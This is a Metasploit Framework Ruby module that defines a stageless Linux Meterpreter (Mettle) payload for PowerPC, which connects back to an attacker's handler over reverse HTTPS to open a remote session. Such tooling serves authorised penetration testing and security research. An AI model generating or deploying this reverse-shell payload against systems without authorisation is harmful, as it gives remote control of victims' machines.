##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/reverse_https'
require 'msf/base/sessions/meterpreter_options'
require 'msf/base/sessions/mettle_config'
require 'msf/base/sessions/meterpreter_ppc_linux'

module MetasploitModule
  CachedSize = 1212484

  include Msf::Payload::Single
  include Msf::Sessions::MeterpreterOptions
  include Msf::Sessions::MettleConfig

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Linux Meterpreter, Reverse HTTPS Inline',
        'Description' => 'Run the Meterpreter / Mettle server payload (stageless)',
        'Author' => [
          'Adam Cammack <adam_cammack[at]rapid7.com>',
          'Brent Cook <brent_cook[at]rapid7.com>',
          'timwr'
        ],
        'Platform' => 'linux',
        'Arch' => ARCH_PPC,
        'License' => MSF_LICENSE,
        'Handler' => Msf::Handler::ReverseHttps,
        'Session' => Msf::Sessions::Meterpreter_ppc_Linux
      )
    )
  end

  def generate
    opts = {
      scheme: 'https',
      stageless: true
    }
    MetasploitPayloads::Mettle.new('powerpc-linux-muslsf', generate_config(opts)).to_binary :exec
  end
end
